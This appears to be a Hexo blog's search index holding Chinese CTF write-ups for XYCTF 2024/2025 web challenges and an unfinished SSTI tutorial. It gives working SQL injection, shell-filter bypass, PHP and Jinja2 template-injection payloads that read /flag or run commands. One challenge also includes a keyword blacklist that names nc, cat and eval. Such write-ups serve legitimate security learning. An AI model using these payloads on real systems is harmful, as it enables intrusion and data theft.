<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>xyctf2025web部分wp</title>
      <link href="/2025/04/09/xyctf2025web%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/04/09/xyctf2025web%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h3 id="XYCTF2025"><a href="#XYCTF2025" class="headerlink" title="XYCTF2025"></a>XYCTF2025</h3><h4 id="ezsql-手动滑稽-："><a href="#ezsql-手动滑稽-：" class="headerlink" title="ezsql(手动滑稽)："></a>ezsql(手动滑稽)：</h4><p>(真的没有想到是宽字节注入,第一次做，没有做出来，问学长要wp，我还没有复现出来，我是傻逼，现在只能复现了)</p><p>首先看见题目是sql注入漏洞，打开是让你登录平台，然后就fuzz测试过滤了空格,转义了’(所以要宽字节注入)，关键字到是没有</p><p>然后就是使用substring这个函数：</p><p>解释：</p><p>SUBSTRING(str, pos, len)：</p><ul><li><code>str</code>：表示要从中提取子字符串的原始字符串。</li><li><code>pos</code>：指定子字符串的起始位置。若为正数，则从字符串的开头开始计数；若为负数，则从字符串的末尾开始计数。</li><li><code>len</code>：指定要提取的子字符串的长度。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27;%09or%09substring(database()%09FROM%092%09FOR%091)=&#x27;a&#x27;%23&amp;password=1(爆库)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;%09OR%09substring((select%09table_name%09from%09information_schema.tables%09where%09table_schema=&#x27;testdb&#x27;%09limit%091%09offset%090)%09FROM%091%09FOR%091)=&#x27;a&#x27;%23&amp;password=1(爆表)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;%09OR%09case%09when%09(ascii(substring((select%09column_name%09from%09information_schema.columns%09where%09table_name=&#x27;double_check&#x27;%09limit%091)%09FROM%092%09FOR%091))=116)%09then%091%09else%090%09end=1%23&amp;password=1(爆列)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;%09OR%09case%09when%09(ascii(substring((select%09secret%09from%09double_check%09limit%091)%09FROM%092%09FOR%091))=116)%09then%091%09else%090%09end=1%23&amp;password=1</span><br></pre></td></tr></table></figure><p>然后就像这样一个一个测试，拿到：dtfrtkcc0czkoua9S</p><p>同理：这样一个个测出来账号和密码：yudeyoushang&#x2F;zhonghengyisheng，进去之后直接进行RCE就ok了</p><h4 id="ez-puzzle："><a href="#ez-puzzle：" class="headerlink" title="ez_puzzle："></a>ez_puzzle：</h4><p>这个他要你进行拼图，小游戏先查看js就行，发现不让我看，肯定有好东西，直接ctrl+shift+i查看，知道是小弹窗，js里面搜索alert就行了，发现有判断条件，将小于号改成大于号就行，然后再拼一次就行了。</p><h4 id="出题人已疯："><a href="#出题人已疯：" class="headerlink" title="出题人已疯："></a>出题人已疯：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@File    :   app.py</span><br><span class="line">@Time    :   2025/03/29 15:52:17</span><br><span class="line">@Author  :   LamentXU </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import bottle</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">flag in /flag</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@bottle.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;Hello, World!&#x27;</span><br><span class="line">@bottle.route(&#x27;/attack&#x27;)</span><br><span class="line">def attack():</span><br><span class="line">    payload = bottle.request.query.get(&#x27;payload&#x27;)</span><br><span class="line">    if payload and len(payload) &lt; 25 and &#x27;open&#x27; not in payload and &#x27;\\&#x27; not in payload:</span><br><span class="line">        return bottle.template(&#x27;hello &#x27;+payload)</span><br><span class="line">    else:</span><br><span class="line">        bottle.abort(400, &#x27;Invalid payload&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bottle.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 定义/attack路径的路由</span><br><span class="line">@bottle.route(&#x27;/attack&#x27;)</span><br><span class="line">def attack():</span><br><span class="line">    # 从请求的查询参数中获取payload</span><br><span class="line">    payload = bottle.request.query.get(&#x27;payload&#x27;)</span><br><span class="line">    # 检查payload是否存在，长度是否小于25，并且不包含open和\字符</span><br><span class="line">    if payload and len(payload) &lt; 25 and &#x27;open&#x27; not in payload and &#x27;\\&#x27; not in payload:</span><br><span class="line">        # 使用bottle的模板功能返回包含payload的问候语</span><br><span class="line">        return bottle.template(&#x27;hello &#x27;+payload)</span><br><span class="line">    else:</span><br><span class="line">        # 如果条件不满足，返回400错误</span><br><span class="line">        bottle.abort(400, &#x27;Invalid payload&#x27;)</span><br></pre></td></tr></table></figure><p>也就是说</p><p>需要尝试构造出小于25，并且不包含open和\字符的有效负载或者找到一种方式绕过小于25的限制(不过他是bottle)</p><p>经过测试发现可以使用unicode绕过，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%7b%7b%ba%70%65%6e%28%27%2f%66%6c%61%67%27%29%2e%72%65%61%64%28%29%7d%7d</span><br></pre></td></tr></table></figure><p>不过o可以使用%ba进行绕过(用斜体绕过，nb)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>复现xyctf2024</title>
      <link href="/2025/04/07/%E5%A4%8D%E7%8E%B0xyctf2024/"/>
      <url>/2025/04/07/%E5%A4%8D%E7%8E%B0xyctf2024/</url>
      
        <content type="html"><![CDATA[<h3 id="XYCTF"><a href="#XYCTF" class="headerlink" title="XYCTF:"></a>XYCTF:</h3><h4 id="EZhttp"><a href="#EZhttp" class="headerlink" title="EZhttp:"></a>EZhttp:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进行dirsearch查看有没有其他东西；发现robots.txt文件，然后一步一步进行，发现账号和密码</span><br><span class="line"></span><br><span class="line">发现说不是yuanshen.com的不要；</span><br><span class="line"></span><br><span class="line">改referer；Referer:yuanshen.com</span><br><span class="line"></span><br><span class="line">发现说不是XYCTF的浏览器；</span><br><span class="line"></span><br><span class="line">改UA头；User-Agent: XYCTF</span><br><span class="line"></span><br><span class="line">发现不是本地用户不能访问；</span><br><span class="line"></span><br><span class="line">client-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">发现不是ymzx.qq.com的代理;</span><br><span class="line"></span><br><span class="line">改via; via:ymzx.qq.com</span><br><span class="line"></span><br><span class="line">发现想吃cookie的小饼干；</span><br><span class="line"></span><br><span class="line">改cookie为XYCTF;获得flag</span><br></pre></td></tr></table></figure><h4 id="EZMAKE"><a href="#EZMAKE" class="headerlink" title="EZMAKE:"></a>EZMAKE:</h4><p>先测试一下一些命令；然后试试新学的echo $(&lt;flag)这个命令是将flag给重定向出来然后echo出来</p><p>发现被过滤双写试试得到flag</p><h4 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make:"></a>ez?Make:</h4><p>然后上面的方法用不了了；可以试试pwd查看当前的目录；然后看看cd ..可以用吗，发现可以使用；</p><p>ok了，可以cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;more [d-h][k-m][k-m][9-z][]e-h进行正则匹配</p><h4 id="εZ-¿м-Kε¿"><a href="#εZ-¿м-Kε¿" class="headerlink" title="εZ?¿м@Kε¿?:"></a>εZ?¿м@Kε¿?:</h4><p>发现&#x2F;^[$|(|)|@|[|]|{|}|&lt; | &gt;|-]+$&#x2F;只能使用这里面的符号,那flag怎么办；</p><p>应该是特殊符号表示flag测试发现$&lt;可以表示flag，然后在linux里面$()也是可以进行打印的；</p><p>然后$(&lt;$&lt;)打印flag,但是有过滤；进行双写绕过；出来flag了</p><h4 id="EZRCE"><a href="#EZRCE" class="headerlink" title="EZRCE:"></a>EZRCE:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;\\&#x27;,&#x27;\&#x27;&#x27;,&#x27;$&#x27;,&#x27;&lt;&#x27;];</span><br></pre></td></tr></table></figure><p>只能使用这个发现是0-9 然后有&lt;可以进行重定向操作；使用8进制以及bash中的string语法；</p><p>?cmd&#x3D;$’\154\163’ (ls)发现存在文件，可以使用重定向操作给flag打印出来;?cmd&#x3D;$’\143\141\164’&lt;$’\057\146\154\141\147’</p><p>(cat &lt;&#x2F;flag)</p><h4 id="EZCLASS"><a href="#EZCLASS" class="headerlink" title="EZCLASS:"></a>EZCLASS:</h4><p>发现报错可以想到异常类；new Error()-&gt;getMessage()能够获取到字符串</p><p>a&#x3D;Error&amp;b&#x3D;Error&amp;aa&#x3D;system&amp;bb&#x3D;cat &#x2F;[a-z][a-z]*&amp;c&#x3D;getMessage</p><h4 id="EZPOP"><a href="#EZPOP" class="headerlink" title="EZPOP:"></a>EZPOP:</h4><h4 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up:"></a>warm up:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&lt;?phpinclude &#x27;next.php&#x27;;highlight_file(__FILE__);$XYCTF = &quot;Warm up&quot;;extract($_GET);if (isset($_GET[&#x27;val1&#x27;]) &amp;&amp; isset($_GET[&#x27;val2&#x27;]) &amp;&amp; $_GET[&#x27;val1&#x27;] != $_GET[&#x27;val2&#x27;] &amp;&amp; md5($_GET[&#x27;val1&#x27;]) == md5($_GET[&#x27;val2&#x27;])) &#123;  echo &quot;ez&quot; . &quot;&lt;br&gt;&quot;;&#125; else &#123;  die(&quot;什么情况,这么基础的md5做不来&quot;);&#125;if (isset($md5) &amp;&amp; $md5 == md5($md5)) &#123;  echo &quot;ezez&quot; . &quot;&lt;br&gt;&quot;;&#125; else &#123;  die(&quot;什么情况,这么基础的md5做不来&quot;);&#125;if ($XY == $XYCTF) &#123;  if ($XY != &quot;XYCTF_550102591&quot; &amp;&amp; md5($XY) == md5(&quot;XYCTF_550102591&quot;)) &#123;    echo $level2;  &#125; else &#123;    die(&quot;什么情况,这么基础的md5做不来&quot;);  &#125;&#125; else &#123;  die(&quot;学这么久,传参不会传?&quot;);&#125;`什么情况,这么基础的md5做不来</span><br></pre></td></tr></table></figure><p>这个就是md5绕过了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?val1[]=1&amp;val2[]=2&amp;md5=0e215962017&amp;XY=0e215962017&amp;XYCTF=0e215962017</span><br></pre></td></tr></table></figure><p>首先使用数组绕过然后0e215962017这个是他是md5值等于他自己</p><p>然后访问：LLeeevvveeelll222.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&lt;?phphighlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) &amp;&amp; !preg_match(&#x27;/[0-9]/&#x27;, $_POST[&#x27;a&#x27;]) &amp;&amp; intval($_POST[&#x27;a&#x27;])) &#123;  echo &quot;操作你O.o&quot;;  echo preg_replace($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;],$_GET[&#x27;c&#x27;]); // 我可不会像别人一样设置10来个level&#125; else &#123;  die(&quot;有点汗流浃背&quot;);&#125;`</span><br><span class="line">**Warning**: preg_match() expects parameter 2 to be string, array given in **/var/www/html/LLeeevvveeelll222.php** on line **3**</span><br><span class="line">操作你O.o</span><br><span class="line">**Warning**: preg_replace(): Empty regular expression in **/var/www/html/LLeeevvveeelll222.php** on line **5**</span><br></pre></td></tr></table></figure><p>然后数组可以绕过preg_math和preg_match </p><p>POST:a[]&#x3D;1</p><p>GET:?a&#x3D;&#x2F;1&#x2F;e&amp;b&#x3D;(想执行的命令)&amp;c&#x3D;test(结束)</p><h4 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大:"></a>牢牢记住，逝者为大:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&lt;?phphighlight_file(__FILE__);function Kobe($cmd)&#123;  if (strlen($cmd) &gt; 13) &#123;    die(&quot;see you again~&quot;);  &#125;  if (preg_match(&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;, $cmd)) &#123;    die(&quot;肘死你&quot;);  &#125;  foreach ($_GET as $val_name =&gt; $val_val) &#123;    if (preg_match(&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;, $val_val)) &#123;      return &quot;what can i say&quot;;    &#125;  &#125;  return $cmd;&#125;$cmd = Kobe($_GET[&#x27;cmd&#x27;]);echo &quot;#man,&quot; . $cmd . &quot;,manba out&quot;;echo &quot;&lt;br&gt;&quot;;eval(&quot;#man,&quot; . $cmd . &quot;,mamba out&quot;);`#man,,manba out</span><br></pre></td></tr></table></figure><p>首先限制我们传cmd的长度要在小于13，然后过滤了一些命令</p><p>因为是单行注释，利用url编码给他添加%0a（换行符对应URL编码,接下来是执行语句，我们暂时放一边，此时要想办法让后边的不执行，因此利用URL编码添加%23即#号注释掉后边的，此时中间就可以写shell了。</p><p>长度的话可以传新的参数cmd&#x3D;%0a<code>$_GET[a]</code>;%23</p><p>这个新的参数a的话可以执行命令但是需要进行bash执行，即8进制(记得加$’’)</p><p>这里我用的是：a&#x3D;cp &#x2F;flag nn 就是将&#x2F;flag给复制下来，然后访问nn的时候会自动下载出来，然后flag就出来了，不过要记得用bash执行</p><h4 id="我是一个复读机-："><a href="#我是一个复读机-：" class="headerlink" title="我是一个复读机 ："></a>我是一个复读机 ：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import *</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">app = flask(__name__)</span><br><span class="line">app.secret_key = &#x27;lzlcnb&#x27;  # 设置会话密钥，用于加密会话数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;get&#x27;, &#x27;post&#x27;])</span><br><span class="line">def login():</span><br><span class="line">    if request.method == &#x27;post&#x27;:</span><br><span class="line">        username = request.form[&#x27;username&#x27;]</span><br><span class="line">        password = request.form[&#x27;password&#x27;]</span><br><span class="line"></span><br><span class="line">        # 进行登录验证逻辑，如验证用户名密码是否匹配等</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        # 登录验证成功</span><br><span class="line">        if username==&#x27;admin&#x27; and password==&#x27;asdqwe&#x27;:</span><br><span class="line">            session[&#x27;username&#x27;] = username</span><br><span class="line">            return redirect(&#x27;/index&#x27;)</span><br><span class="line">  </span><br><span class="line">    return render_template(&#x27;login.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/index&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    if &#x27;username&#x27; in session:</span><br><span class="line">        try:</span><br><span class="line">            # word=request.args.get(&#x27;sentence&#x27;)</span><br><span class="line">         </span><br><span class="line">            # if word==&quot;&#123;&#123;&#125;&#125;&quot;:</span><br><span class="line">            #     word=none</span><br><span class="line">            flag=0</span><br><span class="line">            word = request.args.get(&#x27;sentence&#x27;)</span><br><span class="line">        </span><br><span class="line">            balck_array=[&#x27;[&#x27;,&#x27;]&#x27;,&#x27;_&#x27;,&#x27;config&#x27;,&#x27;url_for&#x27;,&#x27;system&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;os&#x27;,&#x27;&quot;&#x27;,&quot;&#x27;&quot;,&#x27;cat&#x27;,&#x27;system&#x27;,&#x27;eval&#x27;,&#x27;more&#x27;,&#x27;tail&#x27;,&#x27;less&#x27;,&#x27;base64&#x27;,&#x27;file&#x27;,&#x27;nc&#x27;,&#x27;python&#x27;,&#x27;exec&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;]</span><br><span class="line">            for i in balck_array:</span><br><span class="line">                if word!=none and i in word:</span><br><span class="line">                    word=&quot;what are you doing,little hacker&quot;</span><br><span class="line">                    break</span><br><span class="line">            if word is not none:</span><br><span class="line">                for i in range(len(word)):</span><br><span class="line">                    if ord(word[i])&amp;gt;128:</span><br><span class="line">                        word=&#x27;&#123;&#x27;+word[0:i]+word[i+1:]+&#x27;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">                        flag+=1</span><br><span class="line">            else:</span><br><span class="line">                word=&quot;what do you want to say&quot;</span><br><span class="line">            if flag:</span><br><span class="line">                word=&quot;我只能看懂你说的英文(＞﹏＜)&quot;+word</span><br><span class="line"></span><br><span class="line">            if &quot;&#123;&#123;&#125;&#125;&quot; in word:</span><br><span class="line">                word = word.replace(&quot;&#123;&#123;&#125;&#125;&quot;,&#x27;&#123; &#123;&#125;&#125;&#x27;)</span><br><span class="line">            html=&#x27;&#x27;&#x27;</span><br><span class="line">        &amp;lt;!doctype html&amp;gt;</span><br><span class="line">&amp;lt;html&amp;gt;</span><br><span class="line">&amp;lt;head&amp;gt;</span><br><span class="line">    &amp;lt;title&amp;gt;我是一个复读机&amp;lt;/title&amp;gt;</span><br><span class="line">    &amp;lt;style&amp;gt;</span><br><span class="line">        body &#123;&#123;</span><br><span class="line">            font-family: arial, sans-serif;</span><br><span class="line">            background-image: url(&#x27;/static/yourname.jpg&#x27;); /* 替换 &#x27;background.jpg&#x27; 为您想要设置的背景图片路径 */</span><br><span class="line">            background-size: cover;</span><br><span class="line">            background-position: center;</span><br><span class="line">            margin: 0;</span><br><span class="line">            padding: 0;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">            height: 100vh;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        form &#123;&#123;</span><br><span class="line">            background-color: rgba(255, 255, 255, 0.8);</span><br><span class="line">            padding: 20px;</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);</span><br><span class="line">            width: 800px;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        h2 &#123;&#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            color: #333;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        label &#123;&#123;</span><br><span class="line">            display: block;</span><br><span class="line">            margin-top: 10px;</span><br><span class="line">            color: #555;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        input[type=&quot;text&quot;],</span><br><span class="line">        input[type=&quot;password&quot;] &#123;&#123;</span><br><span class="line">            width: 100%;</span><br><span class="line">            padding: 8px;</span><br><span class="line">            margin-top: 4px;</span><br><span class="line">            border: 1px solid #ccc;</span><br><span class="line">            border-radius: 4px;</span><br><span class="line">            box-sizing: border-box;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        input[type=&quot;submit&quot;] &#123;&#123;</span><br><span class="line">            width: 100%;</span><br><span class="line">            padding: 8px;</span><br><span class="line">            margin-top: 10px;</span><br><span class="line">            background-color: #007bff;</span><br><span class="line">            color: #fff;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: 4px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        input[type=&quot;submit&quot;]:hover &#123;&#123;</span><br><span class="line">            background-color: #0056b3;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    &amp;lt;/style&amp;gt;</span><br><span class="line">&amp;lt;/head&amp;gt;</span><br><span class="line">&amp;lt;body&amp;gt;</span><br><span class="line">    &amp;lt;form action=&quot;/index&quot; method=&quot;get&quot;&amp;gt;</span><br><span class="line">        &amp;lt;h2&amp;gt;我的宝，你说什么我就说什么&amp;lt;/h2&amp;gt;</span><br><span class="line">        &amp;lt;label for=&quot;sentence&quot;&amp;gt;你想说的话&amp;lt;/label&amp;gt;</span><br><span class="line">        &amp;lt;input type=&quot;text&quot; id=&quot;sentence&quot; name=&quot;sentence&quot; required&amp;gt;</span><br><span class="line"></span><br><span class="line">        &amp;lt;input type=&quot;submit&quot; value=&quot;tell me&quot;&amp;gt;</span><br><span class="line">        &amp;lt;h2&amp;gt;&#123;&#125;&amp;lt;/h2&amp;gt;</span><br><span class="line">    &amp;lt;/form&amp;gt;</span><br><span class="line">&amp;lt;/body&amp;gt;</span><br><span class="line">&amp;lt;/html&amp;gt;&#x27;&#x27;&#x27;.format(word)</span><br><span class="line">    </span><br><span class="line">            return render_template_string(html)</span><br><span class="line">        except exception  as e:</span><br><span class="line">            return &quot;出现了一点小问题&quot;</span><br><span class="line">    else:</span><br><span class="line">        return redirect(&#x27;/&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,debug=true,port=8080)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看源码出来账号：admin&#x2F;asdqwe</p><p>然后进入复读机模式：</p><p>一眼SSTI，注意到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;、&#123;%%&#125;、_、&#x27;</span><br></pre></td></tr></table></figure><p>都被ban了，这我还注个集贸啊😡，然后试试其他的，发现当你输入特殊字符的时候会被执行为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后就使用request和|attr组合技打：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sentence=😡(()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.g)(request.values.h)).read()😡&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=popen&amp;h=cat /flag</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sentence=😡lipsum|attr(request.args.glo)|attr(request.args.ge)(request.args.o)|attr(request.args.po)(request.args.cmd)|attr(request.args.re)()😡&amp;glo=__globals__&amp;ge=__getitem__&amp;o=os&amp;po=popen&amp;cmd=cat /flag&amp;re=read</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sentence=我是()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.l)|attr(request.values.d)(request.values.k)(request.values.h)&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;l=__builtins__&amp;k=eval&amp;h=__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSTI漏洞</title>
      <link href="/2025/04/02/SSTI%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/04/02/SSTI%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h2><h4 id="服务端模板注入"><a href="#服务端模板注入" class="headerlink" title="服务端模板注入"></a>服务端模板注入</h4><p>SSTI(Server-Side Template Injection)从名字可以看出即是服务器端模板注入。比如python中的flask、php的thinkphp、java的spring等框架一般都采用MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。(这篇文章主要是记录python的)</p><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>首先要知道什么是模板，模板可以被认为是一段固定好格式，等着开发人员或者用户来填充信息的文件。通过这种方法，可以做到逻辑与视图分离，更容易、清楚且相对安全地编写前后端不同的逻辑。</p><h5 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI:"></a>SSTI:</h5><p>服务端接收攻击者的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了攻击者插入的可以破坏模板的语句，从而达到攻击者的目的。这么说可能有点抽象，我们看一下下面的python中的基于jinja2的模板渲染。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`from flask import *`</span><br><span class="line">`from jinja2 import *`</span><br><span class="line"></span><br><span class="line">`app = Flask(__name__)`</span><br><span class="line"></span><br><span class="line">`@app.route(&quot;/myan&quot;)`</span><br><span class="line"></span><br><span class="line">`def index():`</span><br><span class="line">    `name = request.args.get(&#x27;name&#x27;,&#x27;guest&#x27;)`</span><br><span class="line">    `html = &#x27;&#x27;&#x27;&lt;h3&gt; Hello %s&#x27;&#x27;&#x27;%name`</span><br><span class="line">    `return render_template_string(html)`</span><br><span class="line"></span><br><span class="line">`if __name__ == &quot;__main__&quot;:`</span><br><span class="line">        `app.run(debug=True)`</span><br></pre></td></tr></table></figure><p>运行后访问<code>http://127.0.0.1:5000/myan</code> 可以发现默认的模板解析参数为guest，从上面的python代码中我们发现服务端的逻辑是接收前端输入的name参数，然后将其返回到后端进行拼接再返回前端进行展示，当我们输入?name&#x3D;myan时可以发现前端返回结果 回显：Hello myan</p><h5 id="模板渲染函数"><a href="#模板渲染函数" class="headerlink" title="模板渲染函数"></a>模板渲染函数</h5><p>这里主要有两种模板渲染函数，render_template_string()与render_template()，其中render_template是用来渲染一个指定文件的。render_template_string()则是用来渲染字符串的。而渲染函数在渲染的时候，往往对用户输入的变量不做渲染，即：<code>&#123;&#123;&#125;&#125;</code>在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把<code>&#123;&#123;&#125;&#125;</code>包裹的内容当做变量解析替换。比如<code>&#123;&#123;2*2&#125;&#125;</code>会被解析成4。因此才有了现在的模板注入漏洞。往往变量我们使用<code>&#123;&#123;恶意代码&#125;&#125;</code>。正因为<code>&#123;&#123;&#125;&#125;</code>包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞。</p><h4 id="SSTI攻击方法："><a href="#SSTI攻击方法：" class="headerlink" title="SSTI攻击方法："></a>SSTI攻击方法：</h4><h5 id="继承关系："><a href="#继承关系：" class="headerlink" title="继承关系："></a>继承关系：</h5><p>这里我想先讲讲类之间的继承关系，因为在后面的攻击中用到的就是这种继承关系的不断调用最终达到一个rce的效果，这里我们就具体讲讲类的继承关系。</p><p><code>class A:pass</code></p><p><code>class B:pass</code></p><p><code>class C:pass</code></p><p><code>class D:pass</code></p><p>可以看到我们创建了4个类，其中的B类继承了A类，C、D类继承了B类,如果我们在这创建一个C的对象c，那么我们就可以通过__class__魔术方法来找到它的当前类</p><p><code>c=C()</code></p><p><code>print(c.__class__.__base__)</code></p><p>可以看到回显C类的父类B类，如果想找到A类那就再加一个<code>.__base__</code></p><p>再之后A类上面应该是没有类了但是其实在python里面所有的类都是object，当我们创建一个类而没有显式地指定它继承的父类时，这个类就会默认继承object类，因此我们在到A类里面再添加一个__base__就能拿到object，当然这样一个一个递进上去的方法有一些麻烦，所以我们可以使用__mro__魔术方法来一步到位看到类的所有父类(由于它是以数组形式的所以我们在后面加上下标就能拿到指定的类了)</p><p><code>print(c.__class__.__mro__[3])</code></p><p>我们在拿到object类后就可以通过object类来查找python中的所有object类的子类，当然这其中会有我们能通过该类rce的子类。我们通过__subclasses__来获取当前类的所有子类，<code>print(c.__class__.__mro__[3].__subclasser__)</code></p><p>可以发现有很多类，前面我们也说到了python的所有类最终都是继承object类的，因此这里存在大量的类，当然我们最终的目的是要去进行rce，因此我们应该寻找与之相关的类，这里就给出一个类<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>，我们在这里找一下，一般大概在第139个，不过具体的环境还是要具体分析，比如我这里就是156(有时候可以使用一些脚本试试)，跟前面的__mro__魔术方法一样是用数组表示的，可以用下标找到对应的类。接下来我们给这个类进行一些初始化方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(c.__class__.__mro__[3].__subclasses__()[156].__init__.__globals__)</span><br></pre></td></tr></table></figure><p>可以发现很多全局变量都在里面，我们需要最后能够进行rce，因此应该找到能执行系统命令的方法，这里用popen函数来执行系统命令，在后面加上具体的函数名即可找到对应的函数，我们执行一下shell命令，这里执行一下whoami，这里一定要记得用.read()来读取一下，因为popen方法返回的是一个与子进程通信的对象，为了从该对象中获取子进程的输出，因此需要使用read()方法来读取子进程的输出</p><p><code>print(c.__class__.__mro__[3].__subclasses__()[156].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read())</code></p><p>可以发现成功执行系统命令，这里我们就其实通过类的继承关系里大致讲完了SSTI的一个攻击的思路。</p><h5 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`__class__            返回该对象所属的类。py万物皆对象，比如某个字符串对象，而其所属的类为&lt;class &#x27;str&#x27;&gt;`</span><br><span class="line">`__base__             以字符串形式返回一个类的父类`</span><br><span class="line">`__bases__            以元组形式返回一个类的全部父类`</span><br><span class="line">`__mro__              返回解析方法调用的顺序，即返回所有父类`</span><br><span class="line">`__subclasses__()     返回这个类的所有子类`</span><br><span class="line">`__init__             初始化类，返回的类型是function`</span><br><span class="line">`__globals__          用于获取function所处空间下可使用的module、方法以及所有变量`</span><br><span class="line">`__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里`</span><br><span class="line">`__str__()            返回描写这个对象的字符串，可以理解成是打印出来。`</span><br><span 